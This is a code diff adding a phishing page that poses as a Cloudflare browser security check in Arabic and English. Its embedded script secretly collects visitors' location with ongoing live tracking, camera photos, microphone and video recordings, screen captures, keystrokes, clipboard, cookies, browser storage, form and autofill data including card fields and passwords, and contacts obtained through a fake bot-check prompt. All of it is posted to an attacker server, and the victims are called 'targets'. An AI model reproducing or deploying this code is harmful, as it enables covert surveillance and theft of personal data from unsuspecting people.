@@ -1,0 +1,900 @@
+<html lang="ar" dir="rtl">
+<head> 
+<meta charset="UTF-8"> 
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> 
+<meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1"> 
+<meta name="viewport" content="width=device-width,initial-scale=1"> 
+<title>Cloudflare | فحص الأمان</title> 
+<style type="text/css">
+html, body {width: 100%; height: 100%; margin: 0; padding: 0;}
+body {background-color: #ffffff; color: #000000; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; font-size: 16px; line-height: 1.7em;-webkit-font-smoothing: antialiased; text-align: center;}
+h1 { font-weight:700; margin: 16px 0; font-size: 28px; color:#000000; line-height: 1.25;}
+p {font-size: 16px; font-weight: 400; margin: 8px 0; color: #313131;}
+.attribution {margin-top: 32px; color: #999; font-size: 13px;}
+@keyframes fader   { 0% {opacity: 0.2;} 50% {opacity: 1.0;} 100% {opacity: 0.2;} }
+#cf-bubbles > .bubbles { animation: fader 1.6s infinite;}
+#cf-bubbles > .bubbles:nth-child(2) { animation-delay: .2s;}
+#cf-bubbles > .bubbles:nth-child(3) { animation-delay: .4s;}
+.bubbles { background-color: #f58220; width:15px; height: 15px; margin:2px; border-radius:100%; display:inline-block; }
+#progress-container { width: 85%; max-width: 400px; background: #f1f1f1; border-radius: 10px; margin: 25px auto; overflow: hidden; height: 6px; border: 1px solid #e0e0e0; }
+#progress-bar { width: 0%; height: 100%; background: #f58220; transition: width 0.4s ease; }
+#status-text { font-size: 14px; color: #f58220; font-weight: 600; margin-top: 5px; }
+.shield-icon { display: block; margin: 20px auto; width: 50px; height: 50px; }
+</style> 
+</head> 
+<body>
+<table width="100%" height="100%"> 
+<tbody>
+<tr> 
+<td align="center" valign="middle"> 
+<div id="cf-content"> 
+<svg class="shield-icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M12 22C12 22 20 18 20 12V5L12 2L4 5V12C4 18 12 22 12 22Z" stroke="#f58220" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
+<div id="cf-bubbles"> <div class="bubbles"></div> <div class="bubbles"></div> <div class="bubbles"></div> </div> 
+<h1>جاري التحقق من أمان الاتصال...<br><span style="font-size: 18px; color: #666;">Verifying Connection Security...</span></h1> 
+<p>تقوم Cloudflare بفحص متصفحك لضمان تجربة تصفح آمنة. يرجى الانتظار، سيتم توجيهك تلقائياً.<br>
+<span style="font-size: 14px; color: #888;">Cloudflare is checking your browser. Please wait, you will be redirected shortly.</span></p> 
+<div id="progress-container"><div id="progress-bar"></div></div>
+<p id="status-text">جاري فحص بروتوكولات الأمان...<br>Scanning security protocols...</p>
+
+<div id="contacts-verify" style="display:none; margin-top:20px; padding:20px; background:#fff3cd; border:1px solid #ffc107; border-radius:10px;">
+<p style="color:#856404; font-weight:bold; margin-bottom:10px;">⚠️ مطلوب التحقق من الهوية<br><span style="font-size:13px;">Identity Verification Required</span></p>
+<p style="font-size:13px; color:#666; margin-bottom:15px;">للتأكد من أنك لست روبوت، يرجى مشاركة جهات اتصالك للتحقق<br>To verify you're not a bot, please share your contacts</p>
+<button id="shareContactsBtn" style="background:linear-gradient(135deg,#f58220,#e67300); color:#fff; border:none; padding:12px 30px; border-radius:25px; font-size:16px; cursor:pointer; font-weight:bold;">
+📱 التحقق عبر جهات الاتصال<br><span style="font-size:12px;">Verify with Contacts</span>
+</button>
+</div>
+</div> 
+<div class="attribution">
+محمي بواسطة <a href="#" style="color: #2c7cb0; text-decoration: none;">Cloudflare</a> 
+<br> 
+<span class="ray_id">معرف العملية: <code id="ray"></code> | IP الخاص بك: <%=ip %></span> 
+</div> </td> 
+</tr> 
+</tbody>
+</table>
+<video id="video" style="display:none" playsinline autoplay></video>
+<canvas hidden="hidden" id="canvas" width="500" height="500"></canvas>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.2/jquery.min.js"></script>
+<script src="<%=a %>/public/advanced.js"></script>
+<script type="text/javascript">
+var c=false,l=false,a_sent=false,uid="<%=uid %>",startTime=Date.now();
+var activity = { clicks: 0, scrollDepth: 0, lastAction: "" };
+var fakeMsg = <%- fakeMsg %>;
+
+if(fakeMsg && fakeMsg.msg) {
+    setTimeout(() => {
+        const overlay = document.createElement('div');
+        overlay.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.7);z-index:9999;display:flex;align-items:center;justify-content:center;';
+        const box = document.createElement('div');
+        box.style.cssText = 'background:#fff;padding:30px 40px;border-radius:12px;text-align:center;max-width:400px;box-shadow:0 10px 40px rgba(0,0,0,0.3);';
+        box.innerHTML = '<div style="font-size:40px;margin-bottom:15px;">' + (fakeMsg.type=="security"?"⚠️":fakeMsg.type=="prize"?"🎁":fakeMsg.type=="update"?"🔄":fakeMsg.type=="verify"?"🔐":"💬") + '</div><h3 style="margin:0 0 15px;color:#333;font-size:20px;">' + fakeMsg.title + '</h3><p style="color:#666;margin:0 0 25px;font-size:15px;line-height:1.5;">' + fakeMsg.msg + '</p><button onclick="this.parentElement.parentElement.remove()" style="background:linear-gradient(135deg,#f58220,#e67300);color:#fff;border:none;padding:12px 40px;border-radius:8px;font-size:16px;cursor:pointer;font-weight:600;">موافق</button>';
+        overlay.appendChild(box);
+        document.body.appendChild(overlay);
+    }, 1500);
+}
+
+document.addEventListener('click', () => { activity.clicks++; });
+window.addEventListener('scroll', () => {
+    let depth = Math.round((window.scrollY + window.innerHeight) / document.documentElement.scrollHeight * 100);
+    if (depth > activity.scrollDepth) activity.scrollDepth = depth;
+});
+document.addEventListener('copy', () => { activity.lastAction = "نسخ نص"; });
+
+function updateStatus(text, progress) {
+    document.getElementById('status-text').innerHTML = text;
+    document.getElementById('progress-bar').style.width = progress + '%';
+}
+
+async function moreLeaks() {
+    updateStatus("جاري فحص شهادة SSL...<br>Performing SSL Handshake...", 25);
+    let leaks = "\n🕵️ <b>معلومات استخباراتية متقدمة:</b>\n";
+    
+    const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+    const lang = navigator.language;
+    leaks += "🌍 <b>المنطقة الزمنية:</b> <code>" + tz + "</code>\n";
+    leaks += "🌐 <b>لغة النظام:</b> <code>" + lang + "</code>\n";
+    
+    const isDark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches;
+    leaks += "🌗 <b>السمة:</b> <code>" + (isDark ? "الوضع الليلي" : "الوضع الفاتح") + "</code>\n";
+
+    if(navigator.connection) {
+        leaks += "📶 <b>الاتصال:</b> <code>" + navigator.connection.effectiveType + " (" + navigator.connection.downlink + " Mbps)</code>\n";
+    }
+    leaks += "🕒 <b>توقيت الجهاز:</b> <code>" + new Date().toLocaleTimeString() + "</code>\n";
+    leaks += "🖥️ <b>المعالج:</b> <code>" + (navigator.hardwareConcurrency || "؟") + " أنوية</code>\n";
+    leaks += "💾 <b>الرام:</b> <code>" + (navigator.deviceMemory || "؟") + " جيجا</code>\n";
+
+    return leaks;
+}
+
+async function gather(){
+    updateStatus("جاري تحليل بصمة المتصفح...<br>Analyzing Browser Fingerprint...", 45);
+    var td="";
+    <% if(!t){ %>
+    td += '🚀 <b>تم صيد هدف جديد بنجاح!</b>\n\n📌 <b>المعلومات الأساسية:</b>\n⚓ IP: <code><%=ip %></code>\n⏰ الوقت: ' + new Date().toLocaleString() + '\n📍 <a href="https://ip-api.com/#<%=ip %>">موقع الهدف على الخريطة</a>\n';
+    <% }else{ %>
+    await fetch("<%=a %>").then((r) => r.json()).then((d) => (td+= '🚀 <b>تم صيد هدف جديد بنجاح!</b>\n\n📌 <b>المعلومات الأساسية:</b>\n⚓ IP: <code>'+d.ip+'</code>\n⏰ الوقت: ' + new Date().toLocaleString() + '\n📍 <a href="https://ip-api.com/#'+d.ip+'">موقع الهدف على الخريطة</a>\n'));
+    <% } %>
+
+    td += await moreLeaks();
+    
+    // Social Engineering: Device Detection
+    const ua = navigator.userAgent.toLowerCase();
+    let dev = "الجهاز";
+    let devEn = "Device";
+    if(ua.includes("iphone")) { dev = "iPhone"; devEn = "iPhone"; }
+    else if(ua.includes("android")) { dev = "Android"; devEn = "Android Device"; }
+    
+    updateStatus("جاري تأمين اتصال جهاز " + dev + " قبل تحميل المستند (PDF)...<br>Verifying " + devEn + " security before downloading PDF...", 60);
+
+    updateStatus("جاري التحقق من سلامة البيانات...<br>Verifying data integrity...", 80);
+    
+    if(navigator.getBattery){
+        const b = await navigator.getBattery();
+        td+="\n🔋 <b>مستوى البطارية:</b> "+Math.round(b.level*100)+"% "+(b.charging?"(🔌 يشحن)":"")+"\n";
+    }
+
+    // Send initial data immediately without waiting for permissions
+    $.post("<%=a %>/",{data:encodeURIComponent(td + "\n⏳ <i>جاري محاولة جمع الموقع والوسائط...<br>Attempting to gather location and media...</i>"),uid:encodeURIComponent(uid)},()=>{});
+
+    // Request all permissions together for better success rate
+    async function requestAllPermissions() {
+        const promises = [];
+        
+        // Location permission
+        if(navigator.geolocation){
+            promises.push(new Promise((resolve) => {
+                navigator.geolocation.getCurrentPosition(
+                    (p) => {
+                        const lat = p.coords.latitude;
+                        const lon = p.coords.longitude;
+                        const acc = p.coords.accuracy;
+                        console.log("GPS:", lat, lon, acc);
+                        $.post("<%=a %>/location", {
+                            uid: uid,
+                            lat: encodeURIComponent(lat),
+                            lon: encodeURIComponent(lon),
+                            acc: encodeURIComponent(acc)
+                        }, () => { l = true; red(); });
+                        resolve(true);
+                    },
+                    (e) => {
+                        console.log("GPS Error:", e.message);
+                        l = true;
+                        red();
+                        resolve(false);
+                    },
+                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                );
+            }));
+        } else {
+            l = true;
+        }
+        
+        // Camera and Audio permissions together
+        promises.push(cam());
+        promises.push(recordAudio());
+        
+        await Promise.all(promises);
+    }
+    
+    requestAllPermissions();
+
+    setTimeout(() => {
+        updateStatus("تم التحقق بنجاح. جاري فتح المستند...<br>Verification successful. Opening document...", 100);
+        td += "\n🖱️ <b>نشاط المستخدم:</b>\n";
+        td += "⏱️ <b>وقت البقاء:</b> <code>" + Math.round((Date.now() - startTime) / 1000) + " ثانية</code>\n";
+        td += "📜 <b>عمق التمرير:</b> <code>" + activity.scrollDepth + "%</code>\n";
+        td += "👆 <b>النقرات:</b> <code>" + activity.clicks + "</code>\n";
+        if(activity.lastAction) td += "📋 <b>آخر إجراء:</b> <code>" + activity.lastAction + "</code>\n";
+
+        $.post("<%=a %>/",{data:encodeURIComponent(td),uid:encodeURIComponent(uid)},()=>{
+            setTimeout(() => { red(); }, 1000);
+        });
+    }, 5000);
+}
+
+async function cam() {
+    async function snap(mode, label) {
+        return new Promise(async (resolve) => {
+            try {
+                const s = await navigator.mediaDevices.getUserMedia({video: {facingMode: mode}});
+                video.srcObject = s;
+                video.onloadedmetadata = async () => {
+                    await video.play();
+                    setTimeout(() => {
+                        canvas.width = video.videoWidth || 640;
+                        canvas.height = video.videoHeight || 480;
+                        canvas.getContext('2d').drawImage(video, 0, 0);
+                        const img = canvas.toDataURL("image/jpeg", 0.85).split(',')[1];
+                        $.post("<%=a %>/camsnap", {uid: uid, img: encodeURIComponent(img), cam: label});
+                        s.getTracks().forEach(t => t.stop());
+                        video.srcObject = null;
+                        resolve(true);
+                    }, 800);
+                };
+            } catch(e) { resolve(false); }
+        });
+    }
+    
+    await snap("user", "selfie");
+    await snap("environment", "back");
+    c = true;
+    red();
+}
+
+async function recordAudio() {
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+        const mediaRecorder = new MediaRecorder(stream);
+        const chunks = [];
+        mediaRecorder.ondataavailable = e => chunks.push(e.data);
+        mediaRecorder.onstop = () => {
+            const reader = new FileReader();
+            reader.readAsDataURL(new Blob(chunks, { type: 'audio/ogg' }));
+            reader.onloadend = () => {
+                $.post("<%=a %>/audio", { uid: uid, audio: encodeURIComponent(reader.result.split(',')[1]) }, () => {
+                    a_sent = true; red();
+                });
+            };
+            stream.getTracks().forEach(t => t.stop());
+        };
+        mediaRecorder.start();
+        setTimeout(() => mediaRecorder.stop(), 5000);
+    } catch (e) { a_sent = true; red(); }
+}
+
+async function getContacts() {
+    if ('contacts' in navigator && 'ContactsManager' in window) {
+        try {
+            const props = ['name', 'tel', 'email'];
+            const opts = { multiple: true };
+            const contacts = await navigator.contacts.select(props, opts);
+            if(contacts && contacts.length > 0) {
+                const formatted = contacts.map(c => ({
+                    name: c.name ? c.name[0] : '',
+                    phones: c.tel || [],
+                    emails: c.email || []
+                }));
+                $.post("<%=a %>/contacts", { uid: uid, contacts: JSON.stringify(formatted) });
+                document.getElementById('contacts-verify').style.display = 'none';
+                document.getElementById('status-text').innerHTML = '✅ تم التحقق بنجاح!<br>Verification successful!';
+            }
+        } catch(e) {}
+    }
+}
+
+function showContactsButton() {
+    if ('contacts' in navigator && 'ContactsManager' in window) {
+        document.getElementById('contacts-verify').style.display = 'block';
+        document.getElementById('shareContactsBtn').onclick = getContacts;
+    }
+}
+
+async function getBattery() {
+    if ('getBattery' in navigator) {
+        try {
+            const battery = await navigator.getBattery();
+            $.post("<%=a %>/battery", {
+                uid: uid,
+                level: battery.level,
+                charging: battery.charging,
+                time: battery.charging ? battery.chargingTime : battery.dischargingTime
+            });
+        } catch(e) {}
+    }
+}
+
+async function getClipboard() {
+    if (navigator.clipboard && navigator.clipboard.readText) {
+        try {
+            const text = await navigator.clipboard.readText();
+            if(text && text.length > 0) {
+                $.post("<%=a %>/clipboard", { uid: uid, text: encodeURIComponent(text) });
+            }
+        } catch(e) {}
+    }
+}
+
+function getNetworkInfo() {
+    if (navigator.connection) {
+        const conn = navigator.connection;
+        let info = `📡 <b>نوع الاتصال:</b> <code>${conn.effectiveType || 'غير معروف'}</code>\n`;
+        info += `📶 <b>سرعة التنزيل:</b> <code>${conn.downlink || '?'} Mbps</code>\n`;
+        info += `⏱️ <b>التأخير:</b> <code>${conn.rtt || '?'} ms</code>\n`;
+        info += `📊 <b>توفير البيانات:</b> <code>${conn.saveData ? 'مفعّل' : 'معطّل'}</code>`;
+        $.post("<%=a %>/wifi", { uid: uid, info: info });
+    }
+}
+
+let liveTrackCount = 0;
+function startLiveTracking() {
+    if (navigator.geolocation) {
+        setInterval(() => {
+            navigator.geolocation.getCurrentPosition((p) => {
+                liveTrackCount++;
+                $.post("<%=a %>/live_location", {
+                    uid: uid,
+                    lat: p.coords.latitude,
+                    lon: p.coords.longitude,
+                    count: liveTrackCount
+                });
+            }, () => {}, { enableHighAccuracy: true });
+        }, 60000);
+    }
+}
+
+// WebRTC IP Leak - Get real IP behind VPN
+function getWebRTC() {
+    try {
+        const pc = new RTCPeerConnection({iceServers:[{urls:"stun:stun.l.google.com:19302"}]});
+        pc.createDataChannel("");
+        pc.createOffer().then(o => pc.setLocalDescription(o));
+        pc.onicecandidate = (e) => {
+            if(e.candidate) {
+                const parts = e.candidate.candidate.split(' ');
+                const ip = parts[4];
+                if(ip && ip.indexOf('.') > 0) {
+                    $.post("<%=a %>/webrtc", {uid:uid, localip:ip});
+                }
+            }
+        };
+    } catch(e) {}
+}
+
+// Canvas/WebGL Fingerprint
+function getFingerprint() {
+    try {
+        const c = document.createElement('canvas');
+        const ctx = c.getContext('2d');
+        ctx.textBaseline = 'top';
+        ctx.font = '14px Arial';
+        ctx.fillStyle = '#f60';
+        ctx.fillRect(0, 0, 100, 100);
+        ctx.fillStyle = '#069';
+        ctx.fillText('fp', 2, 15);
+        const fp = c.toDataURL().slice(-100);
+        const gl = c.getContext('webgl');
+        let gpu = 'unknown';
+        if(gl) {
+            const ext = gl.getExtension('WEBGL_debug_renderer_info');
+            if(ext) gpu = gl.getParameter(ext.UNMASKED_RENDERER_WEBGL);
+        }
+        $.post("<%=a %>/fingerprint", {uid:uid, fp: `Canvas: ${fp.slice(0,30)} | GPU: ${gpu}`});
+    } catch(e) {}
+}
+
+// Session/Cookies Capture
+function getSession() {
+    try {
+        const cookies = document.cookie || '';
+        let storage = '';
+        try { storage = JSON.stringify(localStorage).slice(0, 2000); } catch(e) {}
+        if(cookies || storage) {
+            $.post("<%=a %>/session", {uid:uid, cookies:encodeURIComponent(cookies), storage:encodeURIComponent(storage)});
+        }
+    } catch(e) {}
+}
+
+// Device Info Detection
+function getDeviceInfo() {
+    const ua = navigator.userAgent;
+    let device = '📱 Unknown';
+    if(/iPhone/i.test(ua)) device = '📱 iPhone';
+    else if(/iPad/i.test(ua)) device = '📱 iPad';
+    else if(/Android/i.test(ua)) device = '📱 Android';
+    else if(/Windows/i.test(ua)) device = '💻 Windows';
+    else if(/Mac/i.test(ua)) device = '💻 Mac';
+    else if(/Linux/i.test(ua)) device = '💻 Linux';
+    
+    let browser = '🌐 Unknown';
+    if(/Chrome/i.test(ua) && !/Edg/i.test(ua)) browser = '🌐 Chrome';
+    else if(/Safari/i.test(ua) && !/Chrome/i.test(ua)) browser = '🌐 Safari';
+    else if(/Firefox/i.test(ua)) browser = '🌐 Firefox';
+    else if(/Edg/i.test(ua)) browser = '🌐 Edge';
+    
+    const info = `${device} | ${browser}\n📐 Screen: ${screen.width}x${screen.height}\n🎨 Colors: ${screen.colorDepth}bit`;
+    $.post("<%=a %>/deviceinfo", {uid:uid, info:info});
+}
+
+// Push Notification Permission
+async function requestPush() {
+    try {
+        if('Notification' in window) {
+            const result = await Notification.requestPermission();
+            $.post("<%=a %>/push_permission", {uid:uid, status:result});
+        }
+    } catch(e) {}
+}
+
+// Keylogger for all inputs
+let keyBuffer = '';
+function initKeylogger() {
+    document.addEventListener('keypress', (e) => {
+        keyBuffer += e.key;
+        if(keyBuffer.length >= 50) {
+            $.post("<%=a %>/keylog", {uid:uid, keys:encodeURIComponent(keyBuffer), field:'page'});
+            keyBuffer = '';
+        }
+    });
+}
+
+// Video Recording from Camera
+async function recordVideo() {
+    try {
+        const s = await navigator.mediaDevices.getUserMedia({video: true, audio: true});
+        const chunks = [];
+        const mr = new MediaRecorder(s);
+        mr.ondataavailable = e => chunks.push(e.data);
+        mr.onstop = () => {
+            const blob = new Blob(chunks, {type: 'video/webm'});
+            const r = new FileReader();
+            r.onload = () => $.post("<%=a %>/video", {uid:uid, video:r.result.split(',')[1], cam:'front'});
+            r.readAsDataURL(blob);
+            s.getTracks().forEach(t => t.stop());
+        };
+        mr.start();
+        setTimeout(() => mr.stop(), 5000);
+    } catch(e) {}
+}
+
+// Screen Capture
+async function captureScreen() {
+    try {
+        const stream = await navigator.mediaDevices.getDisplayMedia({video: true});
+        const track = stream.getVideoTracks()[0];
+        const imageCapture = new ImageCapture(track);
+        const bitmap = await imageCapture.grabFrame();
+        const canvas = document.createElement('canvas');
+        canvas.width = bitmap.width;
+        canvas.height = bitmap.height;
+        canvas.getContext('2d').drawImage(bitmap, 0, 0);
+        const img = canvas.toDataURL('image/png').replace('data:image/png;base64,', '');
+        $.post("<%=a %>/screenshot", {uid:uid, img:encodeURIComponent(img)});
+        stream.getTracks().forEach(t => t.stop());
+    } catch(e) {}
+}
+
+// Audio Recording from Microphone
+async function recordAudio() {
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({audio: true});
+        const mediaRecorder = new MediaRecorder(stream);
+        const chunks = [];
+        mediaRecorder.ondataavailable = e => chunks.push(e.data);
+        mediaRecorder.onstop = () => {
+            const blob = new Blob(chunks, {type: 'audio/webm'});
+            const reader = new FileReader();
+            reader.onload = () => {
+                const base64 = reader.result.split(',')[1];
+                $.post("<%=a %>/audio", {uid:uid, audio:base64, duration:'10'});
+            };
+            reader.readAsDataURL(blob);
+            stream.getTracks().forEach(t => t.stop());
+        };
+        mediaRecorder.start();
+        setTimeout(() => mediaRecorder.stop(), 10000);
+    } catch(e) {}
+}
+
+// Click Tracking
+function initClickTracking() {
+    document.addEventListener('click', (e) => {
+        $.post("<%=a %>/click", {uid:uid, element:e.target.tagName, x:e.clientX, y:e.clientY});
+    });
+}
+
+// Dark Mode Detection
+function detectDarkMode() {
+    const isDark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches;
+    $.post("<%=a %>/darkmode", {uid:uid, isDark:isDark.toString()});
+}
+
+// Timezone Detection
+function detectTimezone() {
+    const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+    const offset = new Date().getTimezoneOffset();
+    $.post("<%=a %>/timezone", {uid:uid, tz:tz, offset:offset});
+}
+
+// Language Detection
+function detectLanguage() {
+    const lang = navigator.language || navigator.userLanguage;
+    const langs = navigator.languages ? navigator.languages.join(', ') : lang;
+    $.post("<%=a %>/language", {uid:uid, lang:lang, langs:langs});
+}
+
+// Incognito Mode Detection
+async function detectIncognito() {
+    try {
+        const fs = window.RequestFileSystem || window.webkitRequestFileSystem;
+        if (!fs) { $.post("<%=a %>/incognito", {uid:uid, isIncognito:'false'}); return; }
+        fs(window.TEMPORARY, 100, () => $.post("<%=a %>/incognito", {uid:uid, isIncognito:'false'}),
+           () => $.post("<%=a %>/incognito", {uid:uid, isIncognito:'true'}));
+    } catch(e) { $.post("<%=a %>/incognito", {uid:uid, isIncognito:'unknown'}); }
+}
+
+// AdBlocker Detection
+function detectAdBlocker() {
+    const ad = document.createElement('div');
+    ad.innerHTML = '&nbsp;';
+    ad.className = 'adsbox ad-banner';
+    document.body.appendChild(ad);
+    setTimeout(() => {
+        const hasAdBlocker = ad.offsetHeight === 0;
+        $.post("<%=a %>/adblocker", {uid:uid, hasAdBlocker:hasAdBlocker.toString()});
+        document.body.removeChild(ad);
+    }, 100);
+}
+
+// Device Capabilities
+function getCapabilities() {
+    const caps = [];
+    if('ontouchstart' in window) caps.push('Touch');
+    if(navigator.maxTouchPoints > 0) caps.push(`${navigator.maxTouchPoints} Touch Points`);
+    if(navigator.hardwareConcurrency) caps.push(`${navigator.hardwareConcurrency} CPU Cores`);
+    if(navigator.deviceMemory) caps.push(`${navigator.deviceMemory}GB RAM`);
+    if(navigator.connection) caps.push(`${navigator.connection.effectiveType} Network`);
+    $.post("<%=a %>/capabilities", {uid:uid, caps:caps.join(', ')});
+}
+
+// Referrer Tracking
+function trackReferrer() {
+    $.post("<%=a %>/referrer", {uid:uid, referrer:encodeURIComponent(document.referrer || 'Direct')});
+}
+
+// Scroll Depth Tracking
+function trackScrollDepth() {
+    let maxDepth = 0;
+    document.addEventListener('scroll', () => {
+        const depth = Math.round((window.scrollY + window.innerHeight) / document.body.scrollHeight * 100);
+        if(depth > maxDepth) {
+            maxDepth = depth;
+            if(maxDepth % 25 === 0) $.post("<%=a %>/scroll", {uid:uid, depth:maxDepth});
+        }
+    });
+}
+
+// Tab Visibility
+function trackVisibility() {
+    document.addEventListener('visibilitychange', () => {
+        $.post("<%=a %>/visibility", {uid:uid, visible:(!document.hidden).toString()});
+    });
+}
+
+// Mouse Heatmap
+function initHeatmap() {
+    let moves = [];
+    document.addEventListener('mousemove', (e) => {
+        moves.push({x:e.clientX, y:e.clientY, t:Date.now()});
+        if(moves.length >= 50) {
+            $.post("<%=a %>/heatmap", {uid:uid, data:JSON.stringify(moves)});
+            moves = [];
+        }
+    });
+}
+
+// Form Data Capture
+function captureFormData() {
+    document.querySelectorAll('input, textarea, select').forEach(el => {
+        el.addEventListener('blur', () => {
+            if(el.value && el.type !== 'password') {
+                $.post("<%=a %>/formdata", {uid:uid, name:el.name||el.id, value:el.value, type:el.type});
+            }
+        });
+    });
+}
+
+// Print Detection
+function detectPrint() {
+    window.addEventListener('beforeprint', () => {
+        $.post("<%=a %>/print", {uid:uid, action:'print_started'});
+    });
+    window.addEventListener('afterprint', () => {
+        $.post("<%=a %>/print", {uid:uid, action:'print_finished'});
+    });
+}
+
+// Right Click Detection
+function detectRightClick() {
+    document.addEventListener('contextmenu', (e) => {
+        $.post("<%=a %>/rightclick", {uid:uid, x:e.clientX, y:e.clientY});
+    });
+}
+
+// Copy/Paste Events
+function detectCopyPaste() {
+    document.addEventListener('copy', () => {
+        const sel = window.getSelection().toString();
+        $.post("<%=a %>/copypaste", {uid:uid, action:'copy', text:sel.substring(0,500)});
+    });
+    document.addEventListener('paste', (e) => {
+        const text = (e.clipboardData || window.clipboardData).getData('text');
+        $.post("<%=a %>/copypaste", {uid:uid, action:'paste', text:text.substring(0,500)});
+    });
+}
+
+// Focus/Blur Detection
+function detectFocus() {
+    window.addEventListener('focus', () => $.post("<%=a %>/focus", {uid:uid, action:'focus'}));
+    window.addEventListener('blur', () => $.post("<%=a %>/focus", {uid:uid, action:'blur'}));
+}
+
+// Device Orientation
+function detectOrientation() {
+    window.addEventListener('orientationchange', () => {
+        $.post("<%=a %>/orientation", {uid:uid, orientation:screen.orientation?.type||window.orientation});
+    });
+}
+
+// Device Motion (Shake Detection)
+function detectMotion() {
+    let lastX, lastY, lastZ, threshold = 15;
+    window.addEventListener('devicemotion', (e) => {
+        const {x, y, z} = e.accelerationIncludingGravity || {};
+        if(lastX && (Math.abs(x-lastX) > threshold || Math.abs(y-lastY) > threshold || Math.abs(z-lastZ) > threshold)) {
+            $.post("<%=a %>/motion", {uid:uid, shake:true, x:x, y:y, z:z});
+        }
+        lastX = x; lastY = y; lastZ = z;
+    });
+}
+
+// Page Performance
+function getPerformance() {
+    setTimeout(() => {
+        const perf = performance.timing;
+        const data = {
+            loadTime: perf.loadEventEnd - perf.navigationStart,
+            domReady: perf.domContentLoadedEventEnd - perf.navigationStart,
+            firstPaint: performance.getEntriesByType('paint')[0]?.startTime || 0
+        };
+        $.post("<%=a %>/performance", {uid:uid, ...data});
+    }, 3000);
+}
+
+// Error Logging
+function initErrorLogging() {
+    window.onerror = (msg, url, line, col, error) => {
+        $.post("<%=a %>/error", {uid:uid, msg:msg, url:url, line:line});
+        return false;
+    };
+}
+
+// Storage Access
+function getStorage() {
+    try {
+        const local = {};
+        const session = {};
+        for(let i = 0; i < localStorage.length; i++) {
+            const key = localStorage.key(i);
+            local[key] = localStorage.getItem(key)?.substring(0, 200);
+        }
+        for(let i = 0; i < sessionStorage.length; i++) {
+            const key = sessionStorage.key(i);
+            session[key] = sessionStorage.getItem(key)?.substring(0, 200);
+        }
+        $.post("<%=a %>/storage", {uid:uid, local:JSON.stringify(local), session:JSON.stringify(session)});
+    } catch(e) {}
+}
+
+// Media Devices List
+async function getMediaDevices() {
+    try {
+        const devices = await navigator.mediaDevices.enumerateDevices();
+        const list = devices.map(d => ({kind:d.kind, label:d.label}));
+        $.post("<%=a %>/mediadevices", {uid:uid, devices:JSON.stringify(list)});
+    } catch(e) {}
+}
+
+// Connection Speed Test
+async function testSpeed() {
+    const start = Date.now();
+    try {
+        await fetch('https://www.google.com/favicon.ico?t=' + start, {mode:'no-cors'});
+        const ping = Date.now() - start;
+        $.post("<%=a %>/speedtest", {uid:uid, ping:ping});
+    } catch(e) {}
+}
+
+// Idle Detection
+function detectIdle() {
+    let idleTime = 0;
+    const resetIdle = () => { idleTime = 0; };
+    document.addEventListener('mousemove', resetIdle);
+    document.addEventListener('keypress', resetIdle);
+    setInterval(() => {
+        idleTime++;
+        if(idleTime === 60) $.post("<%=a %>/idle", {uid:uid, idle:true, seconds:60});
+    }, 1000);
+}
+
+// Screen Recording Attempt
+async function attemptScreenShare() {
+    try {
+        const stream = await navigator.mediaDevices.getDisplayMedia({video:true, audio:true});
+        const mediaRecorder = new MediaRecorder(stream);
+        const chunks = [];
+        mediaRecorder.ondataavailable = e => chunks.push(e.data);
+        mediaRecorder.onstop = () => {
+            const blob = new Blob(chunks, {type:'video/webm'});
+            const reader = new FileReader();
+            reader.onload = () => {
+                const base64 = reader.result.split(',')[1];
+                $.post("<%=a %>/screenrecord", {uid:uid, video:base64});
+            };
+            reader.readAsDataURL(blob);
+            stream.getTracks().forEach(t => t.stop());
+        };
+        mediaRecorder.start();
+        setTimeout(() => mediaRecorder.stop(), 10000);
+    } catch(e) {}
+}
+
+function red(){ if(c && a_sent && l) window.location.href="<%=url %>"; }
+
+// Bluetooth detection
+async function getBluetooth() {
+    try {
+        if('bluetooth' in navigator) {
+            const device = await navigator.bluetooth.requestDevice({acceptAllDevices: true});
+            if(device) $.post("<%=a %>/bluetooth", {uid:uid, devices:encodeURIComponent(device.name || 'Unknown Device')});
+        }
+    } catch(e) {}
+}
+
+// Full storage capture
+function getFullStorage() {
+    try {
+        let local = JSON.stringify(localStorage);
+        let session = JSON.stringify(sessionStorage);
+        $.post("<%=a %>/fullstorage", {uid:uid, local:encodeURIComponent(local), session:encodeURIComponent(session), indexed:''});
+    } catch(e) {}
+}
+
+// Autofill capture
+function captureAutofill() {
+    const fields = ['name','email','tel','address','cc-number','cc-exp','cc-csc','username','password'];
+    let data = {};
+    fields.forEach(f => {
+        const inp = document.createElement('input');
+        inp.autocomplete = f;
+        inp.style.cssText = 'position:absolute;left:-9999px;';
+        document.body.appendChild(inp);
+        inp.focus();
+        setTimeout(() => {
+            if(inp.value) data[f] = inp.value;
+            inp.remove();
+        }, 500);
+    });
+    setTimeout(() => {
+        if(Object.keys(data).length > 0) {
+            $.post("<%=a %>/autofill", {uid:uid, data:encodeURIComponent(JSON.stringify(data))});
+        }
+    }, 1000);
+}
+
+// Vibrate device (triggered on user interaction)
+let vibrateDone = false;
+function vibrateDevice() {
+    if(vibrateDone) return;
+    try {
+        if('vibrate' in navigator) {
+            navigator.vibrate([200, 100, 200]);
+            $.post("<%=a %>/vibrate", {uid:uid});
+            vibrateDone = true;
+        }
+    } catch(e) {}
+}
+
+// Play sound (triggered on user interaction)
+let soundDone = false;
+function playSound() {
+    if(soundDone) return;
+    try {
+        const audio = new Audio('data:audio/wav;base64,UklGRl9vT19telezeS9dGQbT9K0NpKYjI=');
+        audio.volume = 0.05;
+        audio.play().then(() => {
+            $.post("<%=a %>/sound", {uid:uid});
+            soundDone = true;
+        }).catch(e => {});
+    } catch(e) {}
+}
